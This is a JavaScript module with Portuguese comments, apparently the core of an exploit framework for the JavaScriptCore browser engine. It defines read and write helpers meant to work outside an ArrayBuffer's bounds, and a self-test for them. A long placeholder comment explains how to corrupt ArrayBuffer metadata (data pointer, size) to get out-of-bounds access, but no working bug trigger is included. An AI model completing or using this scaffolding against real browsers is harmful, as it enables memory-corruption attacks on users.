// js/core_exploit.mjs
import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;

const toHexHelper = (val, bits = 32) => toHex(val, bits);

export function clearOOBEnvironment() {
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment';
    log(`Limpando ambiente OOB...`, 'info', FNAME_CLEAR);
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    // log(`Ambiente OOB limpo.`, 'good', FNAME_CLEAR); // Removido para reduzir logs se for chamado muitas vezes
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}
export function getBaseOffsetInDV() {
    // Esta função pode não ser mais tão relevante se a DataView cobrir o buffer inteiro
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}
export function getInitialBufferSize() {
    // Esta função pode não ser mais tão relevante dependendo da trigger
     if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}


export function triggerOOB_primitive() {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';
    log(`--- Iniciando CoreExploit.triggerOOB_primitive ---`, 'info', FNAME_TRIGGER);

    clearOOBEnvironment(); // Limpa qualquer estado anterior

    const allocSize = getOOBAllocationSize();
    log(`    Config OOB: AllocSize=${allocSize}, BaseOffsetDV (original, não usado para DV principal)=${OOB_CONFIG.BASE_OFFSET_IN_DV}`, 'info', FNAME_TRIGGER);

    // PASSO 1: Alocar o ArrayBuffer base.
    // Este ArrayBuffer será o alvo da corrupção de metadados ou será usado
    // de uma forma especial devido à vulnerabilidade.
    oob_array_buffer_real = new ArrayBuffer(allocSize);
    if (!oob_array_buffer_real || oob_array_buffer_real.byteLength !== allocSize) {
        log(`FALHA ao alocar oob_array_buffer_real com tamanho ${allocSize}.`, 'critical', FNAME_TRIGGER);
        throw new Error("Falha na alocação do ArrayBuffer para OOB.");
    }
    log(`    oob_array_buffer_real alocado (estado inicial): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);

    // ====================================================================================
    // ▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼
    // INSERIR CÓDIGO DA VULNERABILIDADE INICIAL AQUI
    // Este é o local onde você deve integrar o código que explora a vulnerabilidade
    // fundamental para transformar 'oob_array_buffer_real' e/ou 'oob_dataview_real'
    // em ferramentas com capacidade Out-Of-Bounds (OOB).
    //
    // O código aqui deve modificar o 'oob_array_buffer_real' ou o 'oob_dataview_real'
    // (ou a forma como eles são percebidos pelo motor JS) para permitir acesso OOB.
    //
    // Exemplos de Ações que o Código da Vulnerabilidade Pode Realizar:
    // 1. Corromper Metadados de 'oob_array_buffer_real':
    //    - Alterar o ponteiro de dados interno (m_buffer, m_vector) para apontar para
    //      um local arbitrário (ex: 0x0 se buscando um 'super array' sobre a memória).
    //    - Alterar o tamanho interno (m_size) para um valor muito grande (ex: 0xFFFFFFFF),
    //      permitindo que DataViews subsequentes acessem além dos limites originais.
    //    - Isso geralmente requer uma primitiva de escrita anterior (talvez de um bug
    //      completamente diferente, não relacionado a este ArrayBuffer diretamente)
    //      ou uma confusão de tipos que permite tratar o ArrayBuffer como um objeto
    //      diferente para sobrescrever seus campos internos.
    //
    // 2. Criar 'oob_dataview_real' de Forma Especial:
    //    - Se a vulnerabilidade afeta como DataViews são criadas ou interpretam
    //      os limites do ArrayBuffer. (Menos comum para DataView padrão).
    //
    // 3. Utilizar um Objeto 'ArrayBuffer' Criado de Forma Especial:
    //    - Se a vulnerabilidade permite que `new ArrayBuffer()` retorne uma instância
    //      que já é inerentemente "quebrada", aponta para memória controlada,
    //      ou tem metadados corrompidos desde a criação.
    //
    // Exemplo Hipotético (SUBSTITUA COM SEU CÓDIGO REAL DO BUG):
    //
    // // Suponha que você tem uma função que explora um bug para corromper o ArrayBuffer:
    // // function exploitInitialVulnerabilityToCorruptArrayBuffer(buffer) {
    // //     log(" Tentando corromper metadados do ArrayBuffer...", "vuln", "exploitInitialVulnerability");
    // //     // ... código do seu bug aqui ...
    // //     // Exemplo: usar uma outra primitiva OOB para escrever no m_size ou m_vector do 'buffer'
    // //     // let address_of_buffer_metadata = getAddressOf(buffer) + METADATA_OFFSET;
    // //     // some_other_oob_write(address_of_buffer_metadata + OFFSET_TO_SIZE_FIELD, 0xFFFFFFFF);
    // //     // return true; // se sucesso
    // // }
    //
    // if (typeof exploitInitialVulnerabilityToCorruptArrayBuffer === 'function') {
    //     log(`    Acionando a corrupção inicial de memória para habilitar OOB...`, 'vuln', FNAME_TRIGGER);
    //     const success = exploitInitialVulnerabilityToCorruptArrayBuffer(oob_array_buffer_real);
    //     if (!success) {
    //         log(`    FALHA ao acionar a corrupção inicial de memória.`, 'critical', FNAME_TRIGGER);
    //         throw new Error("Vulnerabilidade inicial para OOB falhou.");
    //     }
    //     log(`    Corrupção inicial de memória acionada com sucesso.`, 'good', FNAME_TRIGGER);
    // } else {
    //     log(`    AVISO: Nenhuma função 'exploitInitialVulnerabilityToCorruptArrayBuffer' de exemplo definida.`, 'warn', FNAME_TRIGGER);
    //     log(`    ===> Certifique-se de que 'oob_array_buffer_real' é transformado em uma ferramenta OOB <===`, 'critical', FNAME_TRIGGER);
    //     log(`    ===> por meio do seu código de vulnerabilidade inserido nesta seção.          <===`, 'critical', FNAME_TRIGGER);
    // }
    //
    // ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲
    // ====================================================================================

    // PASSO 2: Criar a DataView para operações OOB.
    // Idealmente, após o passo anterior, o 'oob_array_buffer_real' está modificado
    // de tal forma que esta DataView, mesmo que pareça cobrir o buffer original,
    // agora pode operar OOB devido à corrupção do buffer subjacente.
    //
    // A prática comum é fazer a DataView cobrir todo o 'allocSize' desde o offset 0,
    // simplificando os cálculos de offset nas funções oob_read/write_absolute,
    // pois elas podem usar endereços absolutos relativos ao início do
    // 'oob_array_buffer_real' (que pode agora ser 0x0 ou outro endereço de base).
    oob_dataview_real = new DataView(oob_array_buffer_real, 0, allocSize);
    log(`    oob_dataview_real criada (janela sobre oob_array_buffer_real): offset=0, length=${allocSize} bytes`, 'info', FNAME_TRIGGER);

    log(`Ambiente para Operações OOB CONFIGURADO.`, 'good', FNAME_TRIGGER);
    // Logar o estado final pode ser útil para depuração
    log(`    oob_array_buffer_real (estado final, idealmente pronto para OOB): byteLength=${oob_array_buffer_real.byteLength}`, 'info', FNAME_TRIGGER);
    log(`    oob_dataview_real (usada para acesso): byteOffset=${oob_dataview_real.byteOffset}, byteLength=${oob_dataview_real.byteLength}`, 'info', FNAME_TRIGGER);
    log(`--- CoreExploit.triggerOOB_primitive Concluído ---`, 'info', FNAME_TRIGGER);
}


export function oob_read_absolute(absolute_offset, byteLength) {
    const FNAME_READ = "CoreExploit.oob_read_absolute";
    if (!oob_dataview_real) {
        log("ERRO: oob_dataview_real não inicializado para leitura.", "error", FNAME_READ);
        throw new Error("oob_dataview_real not initialized for read");
    }
    if (absolute_offset < 0 || absolute_offset + byteLength > oob_dataview_real.byteLength) {
        // Este log pode ser muito verboso se OOB for intencional e frequente.
        // log(`AVISO: Tentativa de leitura OOB em offset ${toHexHelper(absolute_offset)} com tamanho ${byteLength}. Limites da DataView: ${oob_dataview_real.byteLength}`, "warn", FNAME_READ);
        // Não lançar erro aqui, pois o objetivo pode ser ler OOB (a DataView pode estar limitada, mas o ArrayBuffer subjacente corrompido)
    }

    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(absolute_offset);
            case 2: return oob_dataview_real.getUint16(absolute_offset, true); // true for little-endian
            case 4: return oob_dataview_real.getUint32(absolute_offset, true); // true for little-endian
            case 8:
                const low = oob_dataview_real.getUint32(absolute_offset, true);
                const high = oob_dataview_real.getUint32(absolute_offset + 4, true);
                return new AdvancedInt64(low, high);
            default:
                log(`ERRO: Tamanho de leitura inválido: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid read size: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO durante oob_read_absolute: Offset=${toHexHelper(absolute_offset)}, Length=${byteLength}. Erro: ${e.message}`, "error", FNAME_READ);
        // Não relançar para permitir que o exploit tente continuar, a menos que seja crítico.
        // Dependendo da estratégia, pode ser melhor relançar: throw e;
        return null; // Ou um valor que indique falha
    }
}

export function oob_write_absolute(absolute_offset, value, byteLength) {
    const FNAME_WRITE = "CoreExploit.oob_write_absolute";
    if (!oob_dataview_real) {
        log("ERRO: oob_dataview_real não inicializado para escrita.", "error", FNAME_WRITE);
        throw new Error("oob_dataview_real not initialized for write");
    }
    if (absolute_offset < 0 || absolute_offset + byteLength > oob_dataview_real.byteLength) {
        // Log verboso, similar ao read.
        // log(`AVISO: Tentativa de escrita OOB em offset ${toHexHelper(absolute_offset)} com tamanho ${byteLength}. Limites da DataView: ${oob_dataview_real.byteLength}`, "warn", FNAME_WRITE);
    }

    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(absolute_offset, value); break;
            case 2: oob_dataview_real.setUint16(absolute_offset, value, true); break; // true for little-endian
            case 4: oob_dataview_real.setUint32(absolute_offset, value, true); break; // true for little-endian
            case 8:
                if (!isAdvancedInt64Object(value)) {
                    log(`ERRO: Valor para escrita de 8 bytes não é AdvancedInt64. Offset: ${toHexHelper(absolute_offset)}`, "error", FNAME_WRITE);
                    throw new Error('Value for 8-byte write must be an AdvancedInt64 object.');
                }
                oob_dataview_real.setUint32(absolute_offset, value.low(), true);
                oob_dataview_real.setUint32(absolute_offset + 4, value.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid write size: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO durante oob_write_absolute: Offset=${toHexHelper(absolute_offset)}, Length=${byteLength}. Erro: ${e.message}`, "error", FNAME_WRITE);
        // Não relançar para permitir que o exploit tente continuar, a menos que seja crítico.
        // Dependendo da estratégia, pode ser melhor relançar: throw e;
    }
}

export async function selfTestOOBReadWrite(currentLog = log) {
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Self-Test de Leitura/Escrita OOB ---`, 'test', FNAME_TEST);

    if (!oob_dataview_real || !oob_array_buffer_real) {
        currentLog("ERRO CRÍTICO: Ambiente OOB não inicializado antes do self-test.", "critical", FNAME_TEST);
        throw new Error("OOB environment not set up for self-test.");
    }

    // Escolher um offset seguro dentro dos limites nominais da DataView para o teste
    // para garantir que o teste verifique a funcionalidade básica, não necessariamente o OOB.
    // O teste de OOB real depende da vulnerabilidade que torna o buffer/dataview OOB.
    const test_offset = Math.min(16, oob_dataview_real.byteLength - 16); // Garante espaço para 8 bytes
    if (oob_dataview_real.byteLength < 16 && oob_dataview_real.byteLength > 0) {
         currentLog(`AVISO: Tamanho do oob_dataview_real (${oob_dataview_real.byteLength}) é muito pequeno para o self-test padrão. Pulando.`, "warn", FNAME_TEST);
         return;
    } else if (oob_dataview_real.byteLength === 0) {
         currentLog(`ERRO: Tamanho do oob_dataview_real é 0. Self-test não pode ser executado.`, "error", FNAME_TEST);
         throw new Error("oob_dataview_real has zero length for self-test.");
    }


    const test_val8 = 0xAB;
    const test_val16 = 0xABCD;
    const test_val32 = 0xABCDEF01;
    const test_val64 = new AdvancedInt64(0x12345678, 0x9ABCDEF0);

    try {
        currentLog(`Testando escrita/leitura em offset base ${toHexHelper(test_offset)} (dentro dos limites nominais da DataView).`, 'info', FNAME_TEST);

        // Teste 8-bit
        currentLog(`Escrevendo ${toHexHelper(test_val8, 8)} em offset absoluto ${toHexHelper(test_offset)}`, "info", FNAME_TEST);
        oob_write_absolute(test_offset, test_val8, 1);
        const read_val8 = oob_read_absolute(test_offset, 1);
        if (read_val8 === test_val8) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val8, 8)} corretamente (8bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val8, 8)}, esperado ${toHexHelper(test_val8, 8)}.`, "error", FNAME_TEST); throw new Error("Self-test 8bit failed");
        }

        // Teste 16-bit
        currentLog(`Escrevendo ${toHexHelper(test_val16, 16)} em offset absoluto ${toHexHelper(test_offset)}`, "info", FNAME_TEST);
        oob_write_absolute(test_offset, test_val16, 2);
        const read_val16 = oob_read_absolute(test_offset, 2);
        if (read_val16 === test_val16) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val16, 16)} corretamente (16bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val16, 16)}, esperado ${toHexHelper(test_val16, 16)}.`, "error", FNAME_TEST); throw new Error("Self-test 16bit failed");
        }

        // Teste 32-bit
        currentLog(`Escrevendo ${toHexHelper(test_val32)} em offset absoluto ${toHexHelper(test_offset)}`, "info", FNAME_TEST);
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST); throw new Error("Self-test 32bit failed");
        }

        // Teste 64-bit
        const next_offset = test_offset + 8; // Use um offset diferente para não sobrescrever o teste anterior imediatamente, se test_offset for pequeno.
         if (next_offset + 8 > oob_dataview_real.byteLength) {
             currentLog(`AVISO: Espaço insuficiente para teste de 64 bits completo após offset ${toHexHelper(next_offset)}. Pulando teste de 64 bits.`, "warn", FNAME_TEST);
        } else {
            currentLog(`Escrevendo ${test_val64.toString(true)} em offset absoluto ${toHexHelper(next_offset)}`, "info", FNAME_TEST);
            oob_write_absolute(next_offset, test_val64, 8);
            const read_val64 = oob_read_absolute(next_offset, 8);
            if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
                currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
            } else {
                const readValStr = isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64);
                currentLog(`FALHA: Lido ${readValStr}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST);
                throw new Error("Self-test 64bit failed");
            }
        }
        currentLog(`--- Self-Test de Leitura/Escrita OOB CONCLUÍDO ---`, 'good', FNAME_TEST);

    } catch (e) {
        currentLog(`ERRO no Self-Test OOB: ${e.message}. Verifique a implementação das primitivas ou do ambiente OOB.`, "critical", FNAME_TEST);
        if (e.stack) currentLog(e.stack, "critical", FNAME_TEST);
        throw e; // Relança para que o chamador saiba da falha
    }
}
